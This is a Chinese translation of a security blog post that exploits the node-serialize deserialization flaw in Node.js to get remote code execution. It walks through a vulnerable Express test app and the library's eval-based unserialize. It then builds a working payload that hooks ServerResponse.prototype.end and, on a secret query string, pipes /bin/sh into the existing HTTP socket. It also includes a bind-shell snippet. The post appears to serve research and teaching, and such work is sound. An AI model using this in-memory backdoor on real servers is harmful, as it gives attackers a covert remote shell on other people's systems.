> 原文链接: https://www.anquanke.com//post/id/85504 


# 【技术分享】针对Node.js的node-serialize模块反序列化漏洞的后续分析


                                阅读量   
                                **123880**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：websecurify
                                <br>原文地址：[http://blog.websecurify.com/2017/02/hacking-node-serialize.html](http://blog.websecurify.com/2017/02/hacking-node-serialize.html)

译文仅供参考，具体内容表达以及含义原文为准

**[![](https://p1.ssl.qhimg.com/t0174f37c943f702bce.png)](https://p1.ssl.qhimg.com/t0174f37c943f702bce.png)**

****

作者：[knight](http://bobao.360.cn/member/contribute?uid=162900179)

预估稿费：200RMB

投稿方式：发送邮件至[linwei#360.cn](mailto:linwei@360.cn)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿

**<br>**

**传送门**

[**【漏洞分析】利用Node.js反序列化的漏洞执行远程代码（含演示视频）**](http://bobao.360.cn/learning/detail/3488.html)



**前言**

对Node.js序列化远程命令执行漏洞的一些后续发现和怎样开发攻击载荷。

几天前我在[opsecx博客上](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)发现了一篇怎样利用一个名为node-serialize的nodejs模块中的RCE（远程执行代码）错误的博客。文章很清楚地解释了模块上存在的问题，我却想到另外一件事，就是Burp的利用过程很复杂，却没有用Burp进行攻击 -Burp 是一个很强大的工具 – 我认为我们可以做得更好。

在这篇文章中，我想展示我对这个特定的RCE的看法，分享一些额外的见解，也许这些看法会对你以后的研究有帮助。

<br>

**攻击方面**

在我们开始之前，先检查攻击面是否可以使用。不要滥用节点序列化模块。 

[![](https://p4.ssl.qhimg.com/t01badabc3becf69166.jpg)](https://p4.ssl.qhimg.com/t01badabc3becf69166.jpg)

下面是所有依赖模块的列表：cdlib，cdlibjs，intelligence，malice，mizukiri，modelproxy-engine-mockjs，node-help，sa-sdk-node，scriby，sdk-sa-node，shelldoc，shoots。 因为没有分析代码，所以没有办法识别这些实现是否也是脆弱的，但是我假设它是脆弱性的。

更重要的是，我们还没有回答这个模块使用有多么广泛的这个问题。 每月2000次下载可能意味着许多事情，很难估计这个数字后面的应用程序数量。 快速浏览一下github和google是获得一些答案的有效方法，但是我却发现一些有趣的地方。

GitHub搜索回显了97个潜在的易受攻击的公共模块/应用程序，这些模块/应用程序最有可能被私人使用，因为没有登录npmjs.com。 通过代码浏览可以理解这个问题是多么广泛（或没有）。 我很惊讶地发现，它与神奇宝贝有关。我要去搞清楚！

我将在这里支持[https://nodesecurity.io](https://nodesecurity.io)  ，因为它是唯一的方法，在这种情况下，还对NodeJS模块系统保持关注。 它对开源项目是免费的。

**<br>**

**测试环境**

到目前为止，我们认为我们正在处理一个具有有限的滥用潜力的漏洞，这从公共安全角度来看是有好处的。 让我们进入更学术的一面，来重新利用它。 为了测试成功，我们需要一个易受攻击的应用程序。 opsecx有一个这样的程序，所以我们将在本练习中使用它。 代码相当简单。



```
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())
app.get('/', function(req, res) `{`
    if (req.cookies.profile) `{`
        var str = new Buffer(req.cookies.profile, 'base64').toString();
        var obj = serialize.unserialize(str);
        if (obj.username) `{`
            res.send("Hello " + escape(obj.username));
        `}`
    `}` else `{`
        res.cookie('profile', "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=", `{`
            maxAge: 900000,
            httpOnly: true
        `}`);
        res.send("Hello stranger");
    `}`
`}`);
app.listen(3000);
```

您将需要以下package.json文件来完成（做NPM的安装）



```
`{`
  "dependencies": `{`
    "cookie-parser": "^1.4.3",
    "escape-html": "^1.0.3",
    "express": "^4.14.1",
    "node-serialize": "0.0.4"
  `}`
`}`
```

所以让我们跳过实际的事情。 从代码中可以看到，此示例Web应用程序正在使用用户配置文件设置cookie，该配置文件是使用易受攻击的节点模块的序列化对象。 这都是在进行base64编码。 要想知道base64字符串在打包时看起来是什么，我们可以使用[ENcoder](https://encoder.secapps.com/)。

[![](https://p2.ssl.qhimg.com/t014e09d8a5d57c5e38.jpg)](https://p2.ssl.qhimg.com/t014e09d8a5d57c5e38.jpg)

这看起来像标准JSON。  首先，让我们设置Rest，以便我们可以测试它。 请注意，我们使用Cookie构建器来获取正确的编码，并且我们正在使用Encode小部件将JSON字符串转换为Base64格式。

[![](https://p0.ssl.qhimg.com/t01b323a86dc62a871d.jpg)](https://p0.ssl.qhimg.com/t01b323a86dc62a871d.jpg)

<br>

**配置攻击载荷**

现在我们有一个工作请求，我们需要配置一个攻击载荷。要做的第一件事是了解节点序列化漏洞究竟是如何工作的。纵观源代码这是很明显的，该模块将连续函数显示[在这里](https://github.com/luin/serialize/blob/c82e7c3c7e802002ae794162508ee930f4506842/lib/serialize.js#L41)。

```
`}` else if(typeof obj[key] === 'function') `{`
  var funcStr = obj[key].toString();
  if(ISNATIVEFUNC.test(funcStr)) `{`
    if(ignoreNativeFunc) `{`
      funcStr = 'function() `{`throw new Error("Call a native function unserialized")`}`';
    `}` else `{`
      throw new Error('Can't serialize a object with a native function property. Use serialize(obj, true) to ignore the error.');
    `}`
  `}`
  outputObj[key] = FUNCFLAG + funcStr;
`}` else `{`
```

一旦我们调用unserialize，这个问题就会显现出来。 确切的方法[在这里](https://github.com/luin/serialize/blob/c82e7c3c7e802002ae794162508ee930f4506842/lib/serialize.js#L75)。



```
if(obj[key].indexOf(FUNCFLAG) === 0) `{`
  obj[key] = eval('(' + obj[key].substring(FUNCFLAG.length) + ')');
`}` else if(obj[key].indexOf(CIRCULARFLAG) === 0) `{`
```

这意味着如果我们创建一个包含以_ $$ ND_FUNC $$ _开头的值的任意参数的JSON对象，我们将执行远程代码，因为它将执行eval。 要测试这个，我们可以使用以下设置。

[![](https://p1.ssl.qhimg.com/t0156dc9095b964123d.jpg)](https://p1.ssl.qhimg.com/t0156dc9095b964123d.jpg)

如果成功，并且它应该是成功的，您将得到一个错误，因为服务器将在请求完成之前退出。现在我们有远程代码执行，但是我们应该可以做得更好。

<br>

**我们的重点**

我发现在opsecx博客提出的利用技术有点粗鲁，但是却是个是非常好的演示。我们已经在关键过程中实现了eval，这样我们可以做许多事情，以便获得更好的入侵，而不需要涉及到python和阶段攻击。

[![](https://p0.ssl.qhimg.com/t018dd3bfaf3abaf1bc.png)](https://p0.ssl.qhimg.com/t018dd3bfaf3abaf1bc.png)

这将存储我们的代码，使我们不必担心编码。 现在我们要做的是修改配置文件cookie，以便代码变量可以嵌入在JSON和特殊方式node-serialize函数的正确编码之后。

[![](https://p0.ssl.qhimg.com/t01f307ed9803081620.jpg)](https://p0.ssl.qhimg.com/t01f307ed9803081620.jpg)

这很漂亮！ 现在每次我们更改代码变量时，配置文件cookie有效负载将通过保持编码链和节点序列化来使其完全完成而动态更改。

<br>

**内存后门**

我们需要处理我们的代码有效负载。 假设我们不知道应用程序是如何工作的，我们需要一个通用的方法来利用它，或者对于任何其他应用程序，没有环境或设置的预先知识。 这意味着我们不能依赖可能存在或可能不存在的全局范围变量。 我们不能依赖express应用程序导出，因此它可以访问额外的路由安装。 我们不想生成新的端口或反向shell，以保持最小的配置文件等。

这是一个很大的要求，但满足一些研究后，很容易找到一种方法，来实现。

我们的旅程从http模块引用ServerResponse函数开始。 ServerResponse的原型用作expressjs中的响应对象的__proto__。



```
/**
 * Response prototype.
 */
var res = module.exports = `{`
  __proto__: http.ServerResponse.prototype
`}`;
This means that if we change the prototype of ServerResponse that will reflect into the __proto__ of the response. The send method from the response object calls into the ServerResponse prototype.
if (req.method === 'HEAD') `{`
  // skip body for HEAD
  this.end();
`}` else `{`
  // respond
  this.end(chunk, encoding);
`}`
```

这意味着一旦send方法被调用，将调用end方法，这恰好来自ServerResponse的原型。 由于send方法被充分地用于任何与expressjs相关的事情，这也意味着我们现在有一个直接的方式来快速访问更有趣的结构，如当前打开的套接字。 如果我们重写原型的end方法，这意味着我们可以从这个引用获得一个对socket对象的引用。

实现这种效果的代码看起来像这样。



```
require('http').ServerResponse.prototype.end = (function (end) `{`
  return function () `{`
    // TODO: this.socket gives us the current open socket
  `}`
`}`)(require('http').ServerResponse.prototype.end)
```

由于我们覆盖了end的原型，我们还需要以某种方式区分我们的启动请求和任何其他请求，因为这可能会导致一些意想不到的行为。 我们将检查查询参数的特殊字符串（abc123），告诉我们这是我们自己的恶意请求。 可以从这样的套接字访问httpMessage对象来检索此信息。



```
require('http').ServerResponse.prototype.end = (function (end) `{`
  return function () `{`
    // TODO: this.socket._httpMessage.req.query give us reference to the query
  `}`
`}`)(require('http').ServerResponse.prototype.end)
```

现在我们准备好一切。 剩下的是启动shell。 在节点中这是相对直接的。



```
var cp = require('child_process')
var net = require('net')
net.createServer((socket) =&gt; `{`
    var sh = cp.spawn('/bin/sh')
    sh.stdout.pipe(socket)
    sh.stderr.pipe(socket)
    socket.pipe(sh.stdin)
`}`).listen(5001)
```

在合并两个段之后，最终代码如下所示。 注意我们如何通过重用已经建立的套接字来重定向结束函数以在节点内产生一个shell。



```
require('http').ServerResponse.prototype.end = (function (end) `{`
  return function () `{`
    if (this.socket._httpMessage.req.query.q === 'abc123') `{`
        var cp = require('child_process')
        var net = require('net')
        var sh = cp.spawn('/bin/sh')
        sh.stdout.pipe(this.socket)
        sh.stderr.pipe(this.socket)
        this.socket.pipe(sh.stdin)
    `}` else `{`
        end.apply(this, arguments)
    `}`
  `}`
`}`)(require('http').ServerResponse.prototype.end)
```

现在打开netcat到localhost 3000并键入以下请求



```
$ nc localhost 3000 GET /?q=abc123 HTTP/1.1 
ls -la
```

[![](https://p0.ssl.qhimg.com/t01ec22f280dd2bf130.jpg)](https://p0.ssl.qhimg.com/t01ec22f280dd2bf130.jpg)

什么？ 你得不到任何东西。你看，我们正在劫持一个现有的套接字，因此我们不是套接字的唯一保管人。 还有其他的事情可能响应那个套接字，所以我们需要确保我们照顾他们。 幸运的是，这是很容易实现与一点知识如何节点套接字工作。 最终的代码看起来像这样。



```
require('http').ServerResponse.prototype.end = (function (end) `{`
  return function () `{`
    if (this.socket._httpMessage.req.query.q === 'abc123') `{`
        ['close', 'connect', 'data', 'drain', 'end', 'error', 'lookup', 'timeout', ''].forEach(this.socket.removeAllListeners.bind(this.socket))
        var cp = require('child_process')
        var net = require('net')
        var sh = cp.spawn('/bin/sh')
        sh.stdout.pipe(this.socket)
        sh.stderr.pipe(this.socket)
        this.socket.pipe(sh.stdin)
    `}` else `{`
        end.apply(this, arguments)
    `}`
  `}`
`}`)(require('http').ServerResponse.prototype.end)
```

现在，只要我们喜欢，我们就可以利用这个漏洞。 可以通过使用相同的服务器进程和建立的套接字打开具有我们的特殊字符串的请求来获得远程外壳。

[![](https://p5.ssl.qhimg.com/t013e280aceec375b3b.jpg)](https://p5.ssl.qhimg.com/t013e280aceec375b3b.jpg)

<br>

**结论**

我们从一个简单的RCE漏洞开始，最终创建了一个通用的方法来生成一个已经建立的HTTP通道的shell，它应该在许多类型的情况下独立工作，有一些注意事项，我会留给你们。 整个事情的最棒的部分是在[Rest](https://rest.secapps.com/)的帮助下是开发简单了很多，这无疑是最后几个帖子中的功劳：[1](http://blog.websecurify.com/2017/02/hacking-wordpress-4-7-0-1.html)，[2](http://blog.websecurify.com/2017/02/hacking-json-web-tokens.html)，[3](http://blog.websecurify.com/2017/01/whats-up-with-rest.html)。

<br>



**传送门**

[**【漏洞分析】利用Node.js反序列化的漏洞执行远程代码（含演示视频）**](http://bobao.360.cn/learning/detail/3488.html)


